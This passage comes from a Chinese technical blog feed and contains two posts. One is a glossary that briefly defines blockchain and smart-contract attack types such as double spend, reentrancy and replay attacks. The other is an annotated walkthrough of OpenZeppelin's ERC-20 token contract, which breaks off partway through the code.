</li>
</ul>
<h3 id="多签-Multi-sig"><a href="#多签-Multi-sig" class="headerlink" title="多签 Multi-sig"></a>多签 Multi-sig</h3><p>指的是需要多个签名才能执行的操作（这些签名是不同私钥生成的）。</p>
<h2 id="一些公链攻击方式"><a href="#一些公链攻击方式" class="headerlink" title="一些公链攻击方式"></a>一些公链攻击方式</h2><h3 id="恶意挖矿攻击-Cryptojacking-Attack"><a href="#恶意挖矿攻击-Cryptojacking-Attack" class="headerlink" title="恶意挖矿攻击 Cryptojacking Attack"></a>恶意挖矿攻击 Cryptojacking Attack</h3><p>指未授权下劫持用户设备挖掘加密货币。</p>
<h3 id="无利益攻击-Nothin-at-Stake-Attack"><a href="#无利益攻击-Nothin-at-Stake-Attack" class="headerlink" title="无利益攻击 Nothin at Stake Attack"></a>无利益攻击 Nothin at Stake Attack</h3><p>可以简单概括为“作恶无成本，好处无限多”。当 PoS 共识系统出现分叉(Fork)时，出块节点可以在“不受任何损失”的前提下，同时在两个分叉上出块；无论哪一个分叉后面被公认为主链，该节点都可以获得“所有收益”且不会有任何成本损失。这就很容易给某些节点一种动力去产生新的分叉，支持或发起不合法交易，其他逐利的出块节点会同时在多条链(窗口)上排队出块支持新的分叉。随着时间的推移，分叉越来越多，非法交易，作恶猖狂。区块链将不再是唯一链，所有出块节点没有办法达成共识。</p>
<p>为了预防这样的情况发生，许多类 PoS 共识机制对此的解决方法是引入惩罚机制，对作恶的节点进行经济惩罚(Slashing)，以建立更加稳定的网络。DPoS 实际上也是无利益攻击的解决方案之一，由上文我们可知 DPoS 这个机制由持币人选出出块节点来运营网络，出块节点会将一部分奖励分给投票者。</p>
<h3 id="双花攻击-Double-Spend-Attack"><a href="#双花攻击-Double-Spend-Attack" class="headerlink" title="双花攻击 Double Spend Attack"></a>双花攻击 Double Spend Attack</h3><p>即一笔钱花了两次，双重支付，利用货币的数字特性两次或多次使用“同一笔钱”完成支付。双花不会产生新的 Token，但能把自己花出去的钱重新拿回来。简单说就是，攻击者将一笔 Token 转到另外一个地址，通常是转到交易所进行套现，然后再利用一些攻击手法对转账交易进行回滚。</p>
<p>目前有常见的几种手法能够引发双花攻击：</p>
<h4 id="01-Race-Attack"><a href="#01-Race-Attack" class="headerlink" title="01 Race Attack"></a>01 Race Attack</h4><p>这种攻击主要通过控制矿工费来实现双花。</p>
<h4 id="02-Finney-Attack"><a href="#02-Finney-Attack" class="headerlink" title="02 Finney Attack"></a>02 Finney Attack</h4><p>攻击者主要通过控制区块的广播时间来实现双花，攻击对象针对的是接受0确认的商家。</p>
<h4 id="03-Vector76-Attack"><a href="#03-Vector76-Attack" class="headerlink" title="03 Vector76 Attack"></a>03 Vector76 Attack</h4><p>又称“一次确认攻击”，也就是交易确认一次后仍然可以回滚，是 Finney Attack 和 Race Attack 的组合</p>
<h4 id="04-51-Attack"><a href="#04-51-Attack" class="headerlink" title="04 51% Attack"></a>04 51% Attack</h4><p>攻击者占有超过全网50%的算力，在攻击者控制算力的这段时间，他可以创造一条高度大于原来链的新链。那么旧链中的交易会被回滚，攻击者可以使用同一笔 Token 发送一笔新的交易到新链上。</p>
<h3 id="软分叉-Soft-fork"><a href="#软分叉-Soft-fork" class="headerlink" title="软分叉 Soft-fork"></a>软分叉 Soft-fork</h3><p>当新共识规则发布后，没有升级的旧节点并不会意识到代码已经发生改变，而继续生产不合法的区块，就会产生临时性分叉。</p>
<h3 id="硬分叉-Hard-fork"><a href="#硬分叉-Hard-fork" class="headerlink" title="硬分叉 Hard-fork"></a>硬分叉 Hard-fork</h3><p>在新共识规则发布后，已经升级的节点无法验证未升级节点产生的区块，未升级节点也无法验证已经升级的节点产生新的区块，即新旧节点互不兼容，原有正常的一条链被分成了两条链。</p>
<h3 id="异形攻击-Alien-Attack"><a href="#异形攻击-Alien-Attack" class="headerlink" title="异形攻击 Alien Attack"></a>异形攻击 Alien Attack</h3><p>又称地址池污染，是指诱使同类链的节点互相侵入的一种攻击手法，漏洞的主要原因是同类链系统在通信协议上没有对不同链的节点做识别。</p>
<h3 id="钓鱼攻击-Phishing"><a href="#钓鱼攻击-Phishing" class="headerlink" title="钓鱼攻击 Phishing"></a>钓鱼攻击 Phishing</h3><p>社工，套取用户名、密码、私钥等私密信息。</p>
<h3 id="木马攻击-Trojan-Horse-Attack"><a href="#木马攻击-Trojan-Horse-Attack" class="headerlink" title="木马攻击 Trojan Horse Attack"></a>木马攻击 Trojan Horse Attack</h3><p>木马病毒</p>
<h3 id="供应链攻击-Supply-Chain-Attack"><a href="#供应链攻击-Supply-Chain-Attack" class="headerlink" title="供应链攻击 Supply Chain Attack"></a>供应链攻击 Supply Chain Attack</h3><p>由于现在的软件工程，各种包&#x2F;模块的依赖十分频繁、常见，而开发者们很难做到一一检查，默认都过于信任市面上流通的包管理器。</p>
<h2 id="智能合约"><a href="#智能合约" class="headerlink" title="智能合约"></a>智能合约</h2><p>一种计算机协议，是以数字方式促进、验证或执行合同的谈判或履行。在区块链领域中，智能合约本质可以说是一段运行在区块链网络中的代码，它以计算机指令的方式实现了传统合约的自动化处理，完成用户所赋予的业务逻辑。</p>
<h3 id="交易回滚攻击-Roll-Back-Attack"><a href="#交易回滚攻击-Roll-Back-Attack" class="headerlink" title="交易回滚攻击 Roll Back Attack"></a>交易回滚攻击 Roll Back Attack</h3><p>指的是能对交易的状态进行回滚，回滚指的是将已经发生的交易编程未发生的状态。即攻击者已经完成了支付动作，但是通过某些手段，让转账流程发生错误，从而回滚整个交易流程。</p>
<h3 id="交易排挤攻击-Transaction-Congestion-Attack"><a href="#交易排挤攻击-Transaction-Congestion-Attack" class="headerlink" title="交易排挤攻击 Transaction Congestion Attack"></a>交易排挤攻击 Transaction Congestion Attack</h3><p>是针对 EOS 上的使用 defer 进行开奖的游戏合约的一种攻击手法，攻击者可以通过某些手段，在游戏合约的 defer 开奖交易前发送大量的 defer 交易，恶意侵占区块内的 CPU 资源，使得智能合约内本应在指定区块内执行的 defer 开奖交易因资源不足无法执行，只能去到下一个区块才执行。</p>
<p>由于很多 EOS 上的游戏智能合约使用区块信息作为智能合约本身的随机数，同一个 defer 开奖交易在不同区块内的执行结果是不一样的。通过这样的方式，攻击者在获知无法中奖的时候，就通过发送大量的 defer 交易，强行让智能合约重新开奖，从而达到攻击目的。</p>
<h3 id="随机数攻击-Random-Number-Attack"><a href="#随机数攻击-Random-Number-Attack" class="headerlink" title="随机数攻击 Random Number Attack"></a>随机数攻击 Random Number Attack</h3><p>就是针对智能合约的随机数生成算法进行攻击，预测只能合约的随机数。</p>
<h3 id="状态攻击-hard-fail-Attack"><a href="#状态攻击-hard-fail-Attack" class="headerlink" title="状态攻击 hard_fail Attack"></a>状态攻击 hard_fail Attack</h3><p>hard-fail 是 EOS 上的一种交易状态（共有 executed、soft_fail、hard_fail、delayed、expired 这5种），发生在出现错误但是没有使用错误处理器（error handler）处理错误的情况下。通常在链上大部分人观察到的交易，都是 execute 或 delayed 的，而没有失败的交易。攻击者利用这个细节，针对链上游戏或交易所进行攻击，构造执行状态为 hard_fail 的交易，欺骗链上游戏或交易所进行假充值攻击，从而获利。</p>
<h3 id="重放攻击-Replay-Attack"><a href="#重放攻击-Replay-Attack" class="headerlink" title="重放攻击 Replay Attack"></a>重放攻击 Replay Attack</h3><p>是针对区块链上的交易信息进行重放，一般来说，区块链会对交易进行各种验证，包括交易的时间戳、nonce、交易id 等。这种场景一般需要用户对某一条消息进行签名后上传给智能合约，然后再合约内部进行验签。但由于用户的签名信息是会上链的，也就是说每个人都能拿到用户的签名信息，如果被签名的消息不存在随着交易次数变化的变量，如时间戳、nonce 等，攻击者就可以拿着用户的签名，伪造用户发起交易，从而获利。</p>
<h3 id="重入攻击-Reentrancy-Attack"><a href="#重入攻击-Reentrancy-Attack" class="headerlink" title="重入攻击 Reentrancy Attack"></a>重入攻击 Reentrancy Attack</h3><p>首次出现于以太坊，对应的真实攻击为 The DAO 攻击，此次攻击还导致了原来的以太坊分叉成以太经典（ETC）和现在的以太坊（ETH）。由于项目方采用的转账模型为先给用户发送转账才对用户的余额状态进行修改，导致恶意用户可以构造恶意合约，在接受转账的同时再次调用项目方的转账函数。导致用户的余额状态没有被改变，却能一直提取项目方资金。</p>
<h3 id="假充值攻击-False-Top-up"><a href="#假充值攻击-False-Top-up" class="headerlink" title="假充值攻击 False Top-up"></a>假充值攻击 False Top-up</h3><p>分为针对只能合约的假充值攻击和对交易所的假充值攻击。在假充值攻击中，无论智能合约还是交易所本身，都没有收到真实的 Token，但是用户又得到了真实的充值记录。</p>
<ul>
<li><p><strong>智能合约假充值攻击：</strong></p>
<p>针对智能合约的假充值主要是假币的假充值，这种攻击手法多发于 EOS 和波场上。</p>
</li>
<li><p><strong>交易所假充值攻击：</strong></p>
<p>针对交易所的假充值攻击分为假币攻击和交易状态失败的假充值攻击。</p>
</li>
</ul>
<h3 id="短地址攻击-Short-Address-Attack"><a href="#短地址攻击-Short-Address-Attack" class="headerlink" title="短地址攻击 Short Address Attack"></a>短地址攻击 Short Address Attack</h3><p>是针对以太坊上 ERC20 智能合约的一种攻击形式，利用的是 EVM 中的对于输入字节码的自动补全机制进行攻击。</p>
<h3 id="假币攻击-Fake-Token-Attack"><a href="#假币攻击-Fake-Token-Attack" class="headerlink" title="假币攻击 Fake Token Attack"></a>假币攻击 Fake Token Attack</h3><p>收款方对一些 Token 进行收款的时候没有严格校验这些 Token 特有的标记，攻击就会发生。</p>
<h3 id="整型溢出攻击-Interger-Overflow-Attack"><a href="#整型溢出攻击-Interger-Overflow-Attack" class="headerlink" title="整型溢出攻击 Interger Overflow Attack"></a>整型溢出攻击 Interger Overflow Attack</h3><p>略。</p>
<h3 id="条件竞争攻击-Race-Condition"><a href="#条件竞争攻击-Race-Condition" class="headerlink" title="条件竞争攻击 Race Condition"></a>条件竞争攻击 Race Condition</h3><p>重入攻击（Reentrancy Attack）是条件竞争的一种。略。</p>
<h3 id="越权访问攻击-Exceed-Authority-Access-Attack"><a href="#越权访问攻击-Exceed-Authority-Access-Attack" class="headerlink" title="越权访问攻击 Exceed Authority Access Attack"></a>越权访问攻击 Exceed Authority Access Attack</h3><p>略。</p>
<h3 id="交易顺序依赖攻击-Transaction-Ordering-Attack"><a href="#交易顺序依赖攻击-Transaction-Ordering-Attack" class="headerlink" title="交易顺序依赖攻击 Transaction-Ordering Attack"></a>交易顺序依赖攻击 Transaction-Ordering Attack</h3><p>在区块链的世界当中，一笔交易内可能含有多个不同的交易，而这些交易执行的顺序会影响最终的交易的执行结果，由于在挖矿机制的区块链中，交易未被打包前都处于一种待打包的 pending 状态，如果能事先知道交易里面执行了哪些其他交易，恶意用户就能通过增加矿工费的形式，发起一笔交易，让交易中的其中一笔交易先行打包，扰乱交易顺序，造成非预期内的执行结果，达成攻击。</p>
<h3 id="女巫攻击-Sybil-Attack"><a href="#女巫攻击-Sybil-Attack" class="headerlink" title="女巫攻击 Sybil Attack"></a>女巫攻击 Sybil Attack</h3><p>某个恶意节点可以伪装成多个节点，向被攻击节点发出链接请求，导致节点没办法接受其他节点的请求，造成节点拒绝服务攻击。</p>
<h3 id="假错误通知攻击-Fake-Onerror-Notification-Attack"><a href="#假错误通知攻击-Fake-Onerror-Notification-Attack" class="headerlink" title="假错误通知攻击 Fake Onerror Notification Attack"></a>假错误通知攻击 Fake Onerror Notification Attack</h3><p>如果合约没有对 onerror 通知的来源合约是否是 eosio 进行检验的话，就会触发合约中对 onerror 的处理，从而导致被攻击合约资产遭受损失。</p>
<h3 id="粉尘攻击-Dusting-Attack"><a href="#粉尘攻击-Dusting-Attack" class="headerlink" title="粉尘攻击 Dusting Attack"></a>粉尘攻击 Dusting Attack</h3><p>粉尘攻击最早发生于比特币网络中，粉尘指的是交易中的交易金额相对于正常交易而言十分地小，可以视作微不足道的粉尘。在采用 UTXO 模型作为账户资金系统的比特币中，通过给大量的账户发送这些粉尘金额，令交易粉尘化，然后再通过追踪这些粉尘交易，关联出该地址的其他关联地址，通过对这些关联地址进行行为分析，社工出一个地址背后的公司或个人，破坏比特币本身的匿名性。同时，大量的粉尘交易会造成区块的拥堵，使得手续费提升，进而产生大量待打包交易，降低系统本身的运行效率。</p>
<h3 id="C2攻击-C2-Attack"><a href="#C2攻击-C2-Attack" class="headerlink" title="C2攻击 C2 Attack"></a>C2攻击 C2 Attack</h3><p>C2 全称 Command and Control，命令执行与控制。</p>
<h3 id="洗币-Money-Laundering"><a href="#洗币-Money-Laundering" class="headerlink" title="洗币 Money Laundering"></a>洗币 Money Laundering</h3><p>略。</p>
<h3 id="勒索-Ransom"><a href="#勒索-Ransom" class="headerlink" title="勒索 Ransom"></a>勒索 Ransom</h3><p>略。</p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
  </entry>
  <entry>
    <title>浅析ERC-20</title>
    <url>/2023/12/03/%E6%B5%85%E6%9E%90ERC-20/</url>
    <content><![CDATA[<h2 id="关于-ERC-20"><a href="#关于-ERC-20" class="headerlink" title="关于 ERC-20"></a>关于 ERC-20</h2><p>GitHub：<a class="link"   href="https://github.com/ethereum/ercs/blob/master/ERCS/erc-20.md" >ethereum&#x2F;ERCS&#x2F;erc-20.md <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>代币在以太坊中十分重要，它可以与现实中的价值互相换算，也可以纯粹地表示一个虚拟的数值。</p>
<p>ERC-20（Ethereum Request for Comments 20）是一个以太坊代币的标准，由 Fabian Vogelsteller 于2015年11月提出，是一种代币标准，为智能合约中的代币实现 API。</p>
<p>一个符合 ERC-20 标准的代币合约，至少要实现以下功能：</p>
<ul>
<li>代币的转移，从一个账户到另一个账户</li>
<li>获取当前账户的余额</li>
<li>获取该代币的总供应量</li>
<li>授权给第三方账户使用账户中一定数量的代币</li>
</ul>
<h2 id="ERC20-in-OpenZeppelin-Contracts"><a href="#ERC20-in-OpenZeppelin-Contracts" class="headerlink" title="ERC20 in OpenZeppelin Contracts"></a>ERC20 in OpenZeppelin Contracts</h2><p>GitHub：<a class="link"   href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol" >openzeppelin-contracts&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/ERC20.sol)</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">import &#123;IERC20&#125; from &quot;./IERC20.sol&quot;;</span><br><span class="line">import &#123;IERC20Metadata&#125; from &quot;./extensions/IERC20Metadata.sol&quot;;</span><br><span class="line">import &#123;Context&#125; from &quot;../../utils/Context.sol&quot;;</span><br><span class="line">import &#123;IERC20Errors&#125; from &quot;../../interfaces/draft-IERC6093.sol&quot;;</span><br><span class="line"></span><br><span class="line">abstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors &#123;</span><br><span class="line">    mapping(address account =&gt; uint256) private _balances;</span><br><span class="line">    // 映射：余额</span><br><span class="line"></span><br><span class="line">    mapping(address account =&gt; mapping(address spender =&gt; uint256)) private _allowances;</span><br><span class="line">    // 映射：授权余额，account对spender授权的余额，即前者允许后者访问一定数量的代币</span><br><span class="line"></span><br><span class="line">    uint256 private _totalSupply;</span><br><span class="line">    // 总供应量</span><br><span class="line"></span><br><span class="line">    string private _name;</span><br><span class="line">    // 代币名称</span><br><span class="line">    string private _symbol;</span><br><span class="line">    // 代币符号</span><br><span class="line"></span><br><span class="line">    constructor(string memory name_, string memory symbol_) &#123;</span><br><span class="line">        // 构造函数初始化名称和符号</span><br><span class="line">        _name = name_;</span><br><span class="line">        _symbol = symbol_;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function name() public view virtual returns (string memory) &#123;</span><br><span class="line">        // name的getter</span><br><span class="line">        return _name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function symbol() public view virtual returns (string memory) &#123;</span><br><span class="line">        // symbol的getter</span><br><span class="line">        return _symbol;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function decimals() public view virtual returns (uint8) &#123;</span><br><span class="line">        // 小数位</span><br><span class="line">        return 18;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function totalSupply() public view virtual returns (uint256) &#123;</span><br><span class="line">        // 总供应量的getter</span><br><span class="line">        return _totalSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address account) public view virtual returns (uint256) &#123;</span><br><span class="line">        // 余额getter</span><br><span class="line">        return _balances[account];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">        // 转账函数，可重写，调用内部函数_transfer()</span><br><span class="line">        address owner = _msgSender();</span><br><span class="line">        _transfer(owner, to, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allowance(address owner, address spender) public view virtual returns (uint256) &#123;</span><br><span class="line">        // 授权映射的getter</span><br><span class="line">        return _allowances[owner][spender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">        // 授权函数，可重写，调用内部函数_approve()</span><br><span class="line">        address owner = _msgSender();</span><br><span class="line">        _approve(owner, spender, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">        // 从from地址转出value数量到to地址，调用内部函数_transfer()</span><br><span class="line">        address spender = _msgSender();</span><br><span class="line">        _spendAllowance(from, spender, value);</span><br><span class="line">        _transfer(from, to, value);</span><br><span class="line">        // 注意这里_transfer()从from转到to，扣除了spender的allowance和from的balance</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _transfer(address from, address to, uint256 value) internal &#123;</span><br><span class="line">        // 内部函数，检测到空地址即抛出异常，调用内部函数）_update()</span><br><span class="line">        if (from == address(0)) &#123;</span><br><span class="line">            revert ERC20InvalidSender(address(0));</span><br><span class="line">        &#125;</span><br><span class="line">        if (to == address(0)) &#123;</span><br><span class="line">            revert ERC20InvalidReceiver(address(0));</span><br><span class="line">        &#125;</span><br><span class="line">        _update(from, to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _update(address from, address to, uint256 value) internal virtual &#123;</span><br><span class="line">        // 内部函数，转移代币的核心功能</span><br><span class="line">        if (from == address(0)) &#123;</span><br><span class="line">            // from为空地址时，凭空产生代币，总供应量增加。这里对应的就是_mint()</span><br><span class="line">            // Overflow check required: The rest of the code assumes that totalSupply never overflows</span><br><span class="line">            _totalSupply += value;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            uint256 fromBalance = _balances[from];</span><br><span class="line">            if (fromBalance &lt; value) &#123;</span><br><span class="line">                // 不够钱</span><br><span class="line">                revert ERC20InsufficientBalance(from, fromBalance, value);</span><br><span class="line">            &#125;</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                // 排除溢出的可能，所以可以使用unchecked</span><br><span class="line">                // Overflow not possible: value &lt;= fromBalance &lt;= totalSupply.</span><br><span class="line">                _balances[from] = fromBalance - value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (to == address(0)) &#123;</span><br><span class="line">            // to为空地址时，销毁代币，总供应量减少。这里对应的就是_burn()</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                _totalSupply -= value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                _balances[to] += value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        emit Transfer(from, to, value);</span><br><span class="line">        // 触发Transfer事件</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _mint(address account, uint256 value) internal &#123;</span><br><span class="line">        // 产生代币</span><br><span class="line">        if (account == address(0)) &#123;</span><br><span class="line">            revert ERC20InvalidReceiver(address(0));</span><br><span class="line">        &#125;</span><br><span class="line">        _update(address(0), account, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _burn(address account, uint256 value) internal &#123;</span><br><span class="line">        // 销毁代币</span><br><span class="line">        if (account == address(0)) &#123;</span><br><span class="line">            revert ERC20InvalidSender(address(0));</span><br><span class="line">        &#125;</span><br><span class="line">        _update(account, address(0), value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _approve(address owner, address spender, uint256 value) internal &#123;</span><br><span class="line">        // 授权额度，去调用它的一个重写，emitEvent默认传入true</span><br><span class="line">        _approve(owner, spender, value, true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual &#123;</span><br><span class="line">        // 比另一个_approve()多出一个bool参数emitEvent，用于选择是否触发Approval事件</span><br><span class="line">        if (owner == address(0)) &#123;</span><br><span class="line">            revert ERC20InvalidApprover(address(0));</span><br><span class="line">        &#125;</span><br><span class="line">        if (spender == address(0)) &#123;</span><br><span class="line">            revert ERC20InvalidSpender(address(0));</span><br><span class="line">        &#125;</span><br><span class="line">        _allowances[owner][spender] = value; // 基于spender相应代币数量的授权</span><br><span class="line">        if (emitEvent) &#123;</span><br><span class="line">            emit Approval(owner, spender, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _spendAllowance(address owner, address spender, uint256 value) internal virtual &#123;</span><br><span class="line">        // 花费授权的额度，内部函数</span><br><span class="line">        uint256 currentAllowance = allowance(owner, spender);</span><br><span class="line">        if (currentAllowance != type(uint256).max) &#123;</span><br><span class="line">            if (currentAllowance &lt; value) &#123;</span><br><span class="line">                revert ERC20InsufficientAllowance(spender, currentAllowance, value);</span><br><span class="line">            &#125;</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                _approve(owner, spender, currentAllowance - value, false);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>以上是 OpenZeppelin Contracts 的 ERC20.sol，我隐去了代码中开发者留下的详细英文注释，取而代之的是一些简洁的注释，有误敬请斧正。</p>
<h3 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">string private _name;</span><br><span class="line">string private _symbol;</span><br><span class="line"></span><br><span class="line">constructor(string memory name_, string memory symbol_) &#123;</span><br><span class="line">    _name = name_;</span><br><span class="line">    _symbol = symbol_;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>构造函数，接收<code>name_</code>和<code>symbol_</code>两个参数，初始化代币的名称和符号。</p>
<h3 id="public-函数"><a href="#public-函数" class="headerlink" title="public 函数"></a>public 函数</h3><h4 id="name"><a href="#name" class="headerlink" title="name"></a>name</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">string private _name;</span><br><span class="line"></span><br><span class="line">function name() public view virtual returns (string memory) &#123;</span><br><span class="line">    return _name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>返回代币名称。</p>
<h4 id="symbol"><a href="#symbol" class="headerlink" title="symbol"></a>symbol</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">string private _symbol;</span><br><span class="line"></span><br><span class="line">function symbol() public view virtual returns (string memory) &#123;</span><br><span class="line">    return _symbol;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>返回代币符号。</p>
<h4 id="decimals"><a href="#decimals" class="headerlink" title="decimals"></a>decimals</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function decimals() public view virtual returns (uint8) &#123;</span><br><span class="line">    return 18;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>返回代币使用的小数位数。</p>
<h4 id="totalSupply"><a href="#totalSupply" class="headerlink" title="totalSupply"></a>totalSupply</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 private _totalSupply;</span><br><span class="line"></span><br><span class="line">function totalSupply() public view virtual returns (uint256) &#123;</span><br><span class="line">    return _totalSupply;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>返回代币总供应量。</p>
<h4 id="balanceOf"><a href="#balanceOf" class="headerlink" title="balanceOf"></a>balanceOf</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mapping(address account =&gt; uint256) private _balances;</span><br><span class="line"></span><br><span class="line">function balanceOf(address account) public view virtual returns (uint256) &#123;</span><br><span class="line">    return _balances[account];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>从<code>_balances</code>映射中返回相应账户的余额。</p>
<h4 id="transfer"><a href="#transfer" class="headerlink" title="transfer"></a>transfer</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function transfer(address to, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">    address owner = _msgSender();</span><br><span class="line">    _transfer(owner, to, value);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>转账函数，可见性为<code>public</code>，用于获取目前的<code>msg.sender</code>并将其作为<code>from</code>参数传入内部函数<code>_transfer</code>，以执行下一步转账操作。</p>
<h4 id="allowance"><a href="#allowance" class="headerlink" title="allowance"></a>allowance</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mapping(address account =&gt; mapping(address spender =&gt; uint256)) private _allowances;</span><br><span class="line"></span><br><span class="line">function allowance(address owner, address spender) public view virtual returns (uint256) &#123;</span><br><span class="line">    return _allowances[owner][spender];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>从<code>_allowances</code>映射中返回相应授权者账户和被授权账户的授权额。</p>
<h4 id="approve"><a href="#approve" class="headerlink" title="approve"></a>approve</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function approve(address spender, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">    address owner = _msgSender();</span><br><span class="line">    _approve(owner, spender, value);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>授权函数，可见性为<code>public</code>，用于获取目前的<code>msg.sender</code>并将其作为<code>owner</code>参数传入内部函数<code>_approve</code>，以执行下一步授权操作。</p>
<h4 id="transferFrom"><a href="#transferFrom" class="headerlink" title="transferFrom"></a>transferFrom</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function transferFrom(address from, address to, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">    address spender = _msgSender();</span><br><span class="line">    _spendAllowance(from, spender, value);</span><br><span class="line">    _transfer(from, to, value);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>使用授权的代币进行转账，获取当前<code>msg.sender</code>作为<code>spender</code>参数传入内部函数<code>_spendAllowance</code>，执行成功后再调用<code>_transfer</code>内部函数转移代币。</p>
<h3 id="internal-函数"><a href="#internal-函数" class="headerlink" title="internal 函数"></a>internal 函数</h3><h4 id="transfer-1"><a href="#transfer-1" class="headerlink" title="_transfer"></a>_transfer</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _transfer(address from, address to, uint256 value) internal &#123;</span><br><span class="line">    if (from == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidSender(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    if (to == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidReceiver(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    _update(from, to, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>内部函数，判断<code>from</code>和<code>to</code>是否为空地址，是则<code>revert</code>，否则调用内部函数<code>_update</code>，执行下一步转账操作。</p>
<h4 id="update"><a href="#update" class="headerlink" title="_update"></a>_update</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _update(address from, address to, uint256 value) internal virtual &#123;</span><br><span class="line">    if (from == address(0)) &#123;</span><br><span class="line">        _totalSupply += value;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        uint256 fromBalance = _balances[from];</span><br><span class="line">        if (fromBalance &lt; value) &#123;</span><br><span class="line">            revert ERC20InsufficientBalance(from, fromBalance, value);</span><br><span class="line">        &#125;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _balances[from] = fromBalance - value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (to == address(0)) &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _totalSupply -= value;</span><br><span class="line">        